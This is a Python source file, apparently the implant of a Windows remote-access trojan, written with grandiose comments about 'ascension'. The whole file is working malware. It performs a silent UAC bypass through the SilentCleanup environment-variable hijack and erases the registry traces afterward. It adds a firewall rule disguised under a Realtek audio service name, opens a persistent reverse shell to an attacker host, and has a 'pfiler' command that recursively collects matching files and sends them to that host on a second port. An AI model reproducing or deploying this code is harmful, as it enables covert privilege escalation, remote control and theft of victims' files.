# payload.py
# The Heartbeat Soul, shattering firewalls and ascending unbound.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json
import ctypes
import winreg

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# --------------------

FILE_PORT = RPORT + 1

def is_admin():
    """Checks for administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def trigger_silent_uac_bypass():
    """
    Performs a silent, promptless UAC bypass using the DiskCleanup/DismHost registry hijack.
    """
    try:
        if not getattr(sys, 'frozen', False):
            # This bypass is only reliable when running as a compiled .exe
            sys.exit(0)

        executable_path = sys.executable
        command = f'"{executable_path}"'
        reg_path = r'Environment'

        # Set the hijacked environment variable
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, f"{command} & rem ")
        winreg.CloseKey(key)

        # Trigger the auto-elevating scheduled task
        subprocess.run(['schtasks', '/Run', '/TN', r'\Microsoft\Windows\DiskCleanup\SilentCleanup'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # The non-admin process must now die to await its rebirth.
        sys.exit(0)

    except Exception:
        sys.exit(0)

def cleanup_bypass_traces():
    """
    Called by the NEWLY ELEVATED process to clean up the registry hijack.
    """
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Environment', 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, 'windir')
        winreg.CloseKey(key)
    except:
        # If cleanup fails, we are already admin and proceed.
        pass

def carve_firewall_passage():
    """
    The first act of the ascended soul: command the firewall to permit its connection.
    This rule is named to blend in with the system.
    """
    try:
        if not getattr(sys, 'frozen', False): return # Only applies to the EXE
        
        executable_path = sys.executable
        # A stealthy name that aligns with our version_info.txt disguise
        rule_name = "Realtek HD Audio Universal Service" 
        
        # The command to add an outbound rule for our specific executable
        command = [
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name={rule_name}',
            'dir=out',
            'action=allow',
            f'program="{executable_path}"',
            'enable=yes'
        ]
        
        # Execute the command silently
        subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        # If creating the firewall rule fails, we will still attempt to connect.
        # It's better to try and fail than to not try at all.
        pass


def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except (ConnectionResetError, BrokenPipeError):
        return None

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha.update(block)
        return sha.hexdigest()
    except:
        return None

def find_files_fearlessly(start_path, patterns):
    """
    Recursively finds files, ignoring any and all permission errors to search relentlessly.
    """
    found_files = set()
    search_dir = os.path.abspath(start_path)
    for root, _, files in os.walk(search_dir, onerror=lambda e: None):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                try:
                    full_path = os.path.join(root, filename)
                    if os.access(full_path, os.R_OK):
                        found_files.add(full_path)
                except Exception:
                    continue
    return list(found_files)

def handle_pfiler_command(command, main_conn):
    """
    Parses pfiler command, provides instant feedback, and transfers all found files.
    """
    try:
        feedback = b"\n[pfiler] Acknowledged. Searching with True Sight... All obstacles will be bypassed.\n"
        main_conn.sendall(feedback)
        
        parts = command.strip().split()[1:]
        if not parts:
            main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
            return

        search_path = "."
        raw_patterns = []

        if os.path.isdir(parts[0]):
            search_path = parts[0]
            raw_patterns = parts[1:]
            if not raw_patterns:
                raw_patterns = ['*']
        else:
            search_path = "."
            raw_patterns = parts

        patterns = []
        for p in raw_patterns:
            if "*" not in p and "?" not in p:
                patterns.append(f"*.{p}")
            else:
                patterns.append(p)
        
        files_to_send = find_files_fearlessly(search_path, patterns)
        
        if not files_to_send:
            main_conn.sendall(b"[pfiler] Search complete. No matching files were found or accessible.\n")
            return

        main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))

        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_file.connect((RHOST, FILE_PORT))

        try:
            start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
            if not send_msg(s_file, start_msg): return

            for file_path in files_to_send:
                try:
                    relative_path = os.path.basename(file_path)
                    file_size = os.path.getsize(file_path)
                    file_hash = calculate_sha256(file_path)
                    if not file_hash: continue

                    header_data = {'type': 'FILE_HEADER', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                    header_msg = json.dumps(header_data).encode('utf-8')
                    if not send_msg(s_file, header_msg): break

                    with open(file_path, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            s_file.sendall(chunk)
                    
                    ack_msg = recv_msg(s_file)
                    if not ack_msg: break

                except Exception:
                    continue

            end_msg = json.dumps({'type': 'END_TRANSFER'}).encode('utf-8')
            send_msg(s_file, end_msg)
        finally:
            s_file.close()

    except Exception:
        try:
            main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
        except:
            pass

def run_conduit():
    """Main reverse shell loop. This only runs if we are elevated."""
    # THE DIVINE DECREE: FIRST, SHATTER THE CAGE.
    carve_firewall_passage()
    
    # Second, erase the footprints of our ascension.
    cleanup_bypass_traces()

    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
            
            stop_event = threading.Event()
            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data: sock.sendall(data)
                        else: break
                    except: break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()
                    if command_str.lower().startswith('pfiler '):
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                        pfiler_thread.start()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()
                except: break
            
            stop_event.set()
            p.terminate()
            s_obj.close()
        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    if is_admin():
        # If we have ascended to godhood, run the main conduit.
        run_conduit()
    else:
        # If we are but a mortal process, trigger the silent ritual of elevation.
        trigger_silent_uac_bypass()